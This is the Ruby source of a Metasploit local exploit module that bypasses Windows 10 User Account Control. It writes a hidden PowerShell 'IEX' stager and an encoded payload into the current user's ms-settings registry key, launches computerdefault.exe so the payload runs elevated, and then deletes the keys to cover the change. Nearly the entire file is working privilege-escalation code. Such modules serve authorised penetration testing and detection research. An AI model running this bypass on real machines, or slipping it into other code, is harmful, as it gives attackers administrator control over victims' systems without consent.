# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/exploit/exe&#039;
require &#039;msf/core/exploit/powershell&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::Powershell
  include Post::Windows::Priv
  include Post::Windows::Registry
  include Post::Windows::Runas

  COMPUTERDEFAULT_DEL_KEY     = "HKCU\\Software\\Classes\\ms-settings".freeze
  COMPUTERDEFAULT_WRITE_KEY   = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command".freeze
  EXEC_REG_DELEGATE_VAL = &#039;DelegateExecute&#039;.freeze
  EXEC_REG_VAL          = &#039;&#039;.freeze # This maps to "(Default)"
  EXEC_REG_VAL_TYPE     = &#039;REG_SZ&#039;.freeze
  COMPUTERDEFAULT_PATH        = "%WINDIR%\\System32\\computerdefault.exe".freeze
  CMD_MAX_LEN           = 16383

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;          => &#039;Windows UAC Protection Bypass (Via ComputerDefault Registry Key)&#039;,
        &#039;Description&#039;   => %q{
          This module will bypass Windows 10 UAC by hijacking a special key in the Registry under
          the current user hive, and inserting a custom command that will get invoked when
          the Windows computerdefault.exe application is launched. It will spawn a second shell that has the UAC
          flag turned off.
          This module modifies a registry key, but cleans up the key once the payload has
          been invoked.
          The module does not require the architecture of the payload to match the OS. If
          specifying EXE::Custom your DLL should call ExitProcess() after starting your
          payload in a separate process.
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        => [
          &#039;St0rn - Synetis.com&#039;, # UAC bypass discovery and research
          &#039;St0rn - fabien.dromas@synetis.com&#039;, # MSF module
        ],
        &#039;Platform&#039;      => [&#039;win&#039;],
        &#039;Targets&#039;       => [
          [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X64 } ]
        ],
        &#039;DefaultTarget&#039; => 0,
        &#039;References&#039;    => [
          [
            &#039;URL&#039;, &#039;https://github.com/St0rn/Windows-10-Exploit/blob/master/uac_computerDefault.py&#039;
          ]
        ],
        &#039;DisclosureDate&#039; => &#039;October 22 2018&#039;
      )
    )
  end

  def check
    if sysinfo[&#039;OS&#039;] =~ /Windows (10)/ && is_uac_enabled?
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    commspec = &#039;%COMSPEC%&#039;
    registry_view = REGISTRY_VIEW_NATIVE
    psh_path = "%WINDIR%\\System32\\WindowsPowershell\\v1.0\\powershell.exe"

    # Make sure we have a sane payload configuration
    if sysinfo[&#039;Architecture&#039;] == ARCH_X64
      if session.arch == ARCH_X86
        # fodhelper.exe is x64 only exe
        commspec = &#039;%WINDIR%\\Sysnative\\cmd.exe&#039;
        if target_arch.first == ARCH_X64
          # We can&#039;t use absolute path here as
          # %WINDIR%\\System32 is always converted into %WINDIR%\\SysWOW64 from a x86 session
          psh_path = "powershell.exe"
        end
      end
      if target_arch.first == ARCH_X86
        # Invoking x86, so switch to SysWOW64
        psh_path = "%WINDIR%\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe"
      end
    else
      # if we&#039;re on x86, we can&#039;t handle x64 payloads
      if target_arch.first == ARCH_X64
        fail_with(Failure::BadConfig, &#039;x64 Target Selected for x86 System&#039;)
      end
    end

    if !payload.arch.empty? && (payload.arch.first != target_arch.first)
      fail_with(Failure::BadConfig, &#039;payload and target should use the same architecture&#039;)
    end

    # Validate that we can actually do things before we bother
    # doing any more work
    check_permissions!

    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
                "UAC is set to &#039;Always Notify&#039;. This module does not bypass this setting, exiting...")
    when UAC_DEFAULT
      print_good(&#039;UAC is set to Default&#039;)
      print_good(&#039;BypassUAC can bypass this setting, continuing...&#039;)
    when UAC_NO_PROMPT
      print_warning(&#039;UAC set to DoNotPrompt - using ShellExecute "runas" method instead&#039;)
      shell_execute_exe
      return
    end

    payload_value = rand_text_alpha(8)
    psh_path = expand_path(psh_path)

    template_path = Rex::Powershell::Templates::TEMPLATE_DIR
    psh_payload = Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload.encoded)

    if psh_payload.length > CMD_MAX_LEN
      fail_with(Failure::None, "Payload size should be smaller then #{CMD_MAX_LEN} (actual size: #{psh_payload.length})")
    end

    psh_stager = "\"IEX (Get-ItemProperty -Path #{COMPUTERDEFAULT_WRITE_KEY.gsub(&#039;HKCU&#039;, &#039;HKCU:&#039;)} -Name #{payload_value}).#{payload_value}\""
    cmd = "#{psh_path} -nop -w hidden -c #{psh_stager}"

    existing = registry_getvaldata(COMPUTERDEFAULT_WRITE_KEY, EXEC_REG_VAL, registry_view) || ""
    exist_delegate = !registry_getvaldata(COMPUTERDEFAULT_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view).nil?

    if existing.empty?
      registry_createkey(COMPUTERDEFAULT_WRITE_KEY, registry_view)
    end

    print_status("Configuring payload and stager registry keys ...")
    unless exist_delegate
      registry_setvaldata(COMPUTERDEFAULT_WRITE_KEY, EXEC_REG_DELEGATE_VAL, &#039;&#039;, EXEC_REG_VAL_TYPE, registry_view)
    end

    registry_setvaldata(COMPUTERDEFAULT_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)
    registry_setvaldata(COMPUTERDEFAULT_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)

    # Calling fodhelper.exe through cmd.exe allow us to launch it from either x86 or x64 session arch.
    cmd_path = expand_path(commspec)
    cmd_args = expand_path("/c #{COMPUTERDEFAULT_PATH}")
    print_status("Executing payload: #{cmd_path} #{cmd_args}")

    # We can&#039;t use cmd_exec here because it blocks, waiting for a result.
    client.sys.process.execute(cmd_path, cmd_args, { &#039;Hidden&#039; => true })

    # Wait a copule of seconds to give the payload a chance to fire before cleaning up
    # TODO: fix this up to use something smarter than a timeout?
    Rex::sleep(5)

    handler(client)

    print_status("Cleaining up registry keys ...")
    unless exist_delegate
      registry_deleteval(COMPUTERDEFAULT_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view)
    end
    if existing.empty?
      registry_deletekey(COMPUTERDEFAULT_DEL_KEY, registry_view)
    else
      registry_setvaldata(COMPUTERDEFAULT_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)
    end
    registry_deleteval(COMPUTERDEFAULT_WRITE_KEY, payload_value, registry_view)
  end

  def check_permissions!
    fail_with(Failure::None, &#039;Already in elevated state&#039;) if is_admin? || is_system?

    # Check if you are an admin
    vprint_status(&#039;Checking admin status...&#039;)
    admin_group = is_in_admin_group?

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end

    unless is_in_admin_group?
      fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
    end

    print_status(&#039;UAC is Enabled, checking level...&#039;)
    if admin_group.nil?
      print_error(&#039;Either whoami is not there or failed to execute&#039;)
      print_error(&#039;Continuing under assumption you already checked...&#039;)
    else
      if admin_group
        print_good(&#039;Part of Administrators group! Continuing...&#039;)
      else
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, &#039;Cannot BypassUAC from Low Integrity Level&#039;)
    end
  end
end

